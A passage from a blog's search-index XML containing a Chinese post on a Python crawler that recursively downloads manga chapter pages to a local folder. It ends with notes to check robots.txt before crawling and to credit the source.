class="line"></span><br><span class="line"><span class="comment"># 函数用处：得到所有话。参数说明：Name：漫画名字。a：从a话开始。b：到b话截至。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPage</span>(<span class="params">Name,a,b</span>):</span></span><br><span class="line">    <span class="keyword">for</span> Hua <span class="keyword">in</span> range(a,b+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> recursiveDownload(Name,Hua,<span class="number">1</span>):</span><br><span class="line">            print(<span class="string">&quot;第&quot;</span>+str(Hua)+<span class="string">&quot;话下载完毕。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数用处：递归得到本话的所有页，递归终止条件：访问失败（没有下一页了）。</span></span><br><span class="line"><span class="comment"># 参数说明：Name：漫画名字。Hua：第几话。page：第几页。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursiveDownload</span>(<span class="params">Name,Hua,page</span>):</span></span><br><span class="line">    Url = re.sub(<span class="string">&quot;漫画名字&quot;</span>, Name, MyUrl)</span><br><span class="line">    Url = re.sub(<span class="string">&quot;多少话&quot;</span>, str(Hua) + <span class="string">&quot;话&quot;</span>, Url)</span><br><span class="line">    Url = re.sub(<span class="string">&quot;#&quot;</span>, str(page), Url)</span><br><span class="line">    <span class="keyword">if</span> download(Name, Url, Hua, page):</span><br><span class="line">        recursiveDownload(Name,Hua,page+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数说明：将获取到的漫画页下载到电脑上。</span></span><br><span class="line"><span class="comment"># 参数说明：Name：漫画名字。Url：页面地址。Hua：第几话。page：第几页</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">Name, Url, Hua, page</span>):</span></span><br><span class="line">    response = requests.get(Url, headers=mHeaders)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;G:\\漫画\\&quot;</span> + Name + <span class="string">&quot;\\&quot;</span> + str(Hua)):</span><br><span class="line">            open(<span class="string">&quot;G:\\漫画\\&quot;</span> + Name + <span class="string">&quot;\\&quot;</span> + str(Hua) + <span class="string">&quot;\\&quot;</span> + str(page) + <span class="string">&quot;.jpg&quot;</span>, <span class="string">&#x27;wb&#x27;</span>).write(response.content)</span><br><span class="line">            print(str(Hua) + <span class="string">&quot;\\&quot;</span> + str(page) + <span class="string">&quot;.jpg&quot;</span> + <span class="string">&quot;下载完成！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            os.mkdir(<span class="string">&quot;G:\\漫画\\&quot;</span> + Name + <span class="string">&quot;\\&quot;</span> + str(Hua))</span><br><span class="line">            open(<span class="string">&quot;G:\\漫画\\&quot;</span> + Name + <span class="string">&quot;\\&quot;</span> + str(Hua) + <span class="string">&quot;\\&quot;</span> + str(page) + <span class="string">&quot;.jpg&quot;</span>, <span class="string">&#x27;wb&#x27;</span>).write(response.content)</span><br><span class="line">            print(Name + <span class="string">&quot;第&quot;</span> + str(Hua) + <span class="string">&quot;话\\&quot;</span> + str(page) + <span class="string">&quot;.jpg&quot;</span> + <span class="string">&quot;下载完成！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;连接错误！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getPage(<span class="string">&quot;偷星九月天&quot;</span>,<span class="number">1</span>,<span class="number">459</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><ul>
<li>注意爬取的时候，先查询该网站的robots.txt，看其是否允许爬取，如并在允许范围内进行爬取。</li>
<li>网址已隐藏，私聊可获取。</li>
<li>转载请注明出处。</li>
</ul>
]]></content>
      <categories>
        <category>爬虫笔记</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>递归</tag>
      </tags>
  </entry>
</search>
